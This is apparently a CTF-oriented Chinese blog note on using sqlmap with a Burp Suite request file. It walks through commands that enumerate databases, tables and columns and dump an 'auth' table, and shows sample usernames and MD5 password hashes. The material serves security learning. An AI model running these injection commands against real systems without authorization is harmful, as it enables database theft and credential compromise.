---
title: sqlmap
date: 2023-11-06 21:23:40
tags:
categories: CTF-Tricks
---

sqlmap使用笔记。

官网：[sqlmap: automatic SQL injection and database takeover tool](https://sqlmap.org/)

<!-- more -->

## 结合burpsuit

先使用burpsuit抓包，将请求包内容存入文件，如“burp.log"

## 智能模式

-l 后跟burp请求包文件，--batch 表示使用默认操作，-smart开启智能模式

```shell
sqlmap -l burp.log --batch -smart
```

### 查看数据库

```shell
sqlmap -l burp.log --batch -smart --dbs
```

输出（例）：

```plain
available databases [2]:
[*] information_schema
[*] Inject_sql
```

### 查看数据库里的表

```shell
sqlmap -l burp.log --batch -smart -D Inject_sql --tables 
```

输出（例）：

```plain
Database: Inject_sql
[1 table]
+------+
| auth |
+------+
```

### 查看数据库表里的列

```shell
sqlmap -l burp.log --batch -smart -D Inject_sql -T auth --columns 
```

输出（例）：

```plain
Database: Inject_sql
Table: auth
[2 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| password | varchar(255) |
| username | varchar(255) |
+----------+--------------+
```

### 查看数据库表列里的值

```shell
sqlmap -l burp.log --batch -smart -D Inject_sql -T auth -C password --dump 
```

输出（例）：

```plain
+----------------------------------+
| password                         |
+----------------------------------+
| 098f6bcd4621d373cade4e832627b4f6 |
| 202cb962ac59075b964b07152d234b70 |
| 4aeed0301e36d0e7d405739646ef8ae6 |
| 4e7bdb88640b376ac6646b8f1ecfb558 |
| 72b938f302b9db9b214d9c779c975634 |
| 96e98952b440e8d0361c552fb0e67bc6 |
| e10adc3949ba59abbe56e057f20f883e |
+----------------------------------+
```

```shell
sqlmap -l burp.log --batch -smart -D Inject_sql -T auth -C username --dump 
```

输出（例）：

```
Database: Inject_sql
Table: auth
[7 entries]
+----------+
| username |
+----------+
| 123      |
| admin    |
| lisi     |
| testuser |
| wangwu   |
| zhangsan |
| zhaoliu  |
+----------+
```

### 其它

**对表dump**：也可以直接对表进行dump

**选择注入类型**： 使用 `--technique` 选项可以指定使用的注入技术，如：`--technique=U` （联合查询注入，有具体的payload）或 `--technique=B` （盲注，没有确定的payload）等
